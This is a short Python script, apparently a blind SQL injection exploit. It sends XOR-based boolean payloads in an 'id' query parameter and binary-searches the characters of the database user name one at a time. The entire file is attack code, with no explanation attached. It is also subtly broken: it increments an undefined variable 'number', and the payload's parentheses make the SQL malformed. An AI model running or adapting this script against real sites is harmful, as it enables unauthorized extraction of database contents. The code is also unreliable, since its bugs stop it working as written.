import requests
import time
url = 'http://example.com'
result = ''

for x in range(1,50):
    high = 127
    low = 32
    mid = (high+low)//2     

    while high>low:
        payload = "1^" + "(ascii(substr((select user(),{0},1))>{1})" .format(x,mid)
        data = {'id':payload}
        html = requests.get(url,params=data).text    
        time.sleep(0.5)
        print(html)
        if "Hello" in html:
            high = mid
            number=number+1
        else:
            low = mid+1
        mid = (low+high)//2
    result += chr(int(mid))     
    print(result)
print("user:",result) 
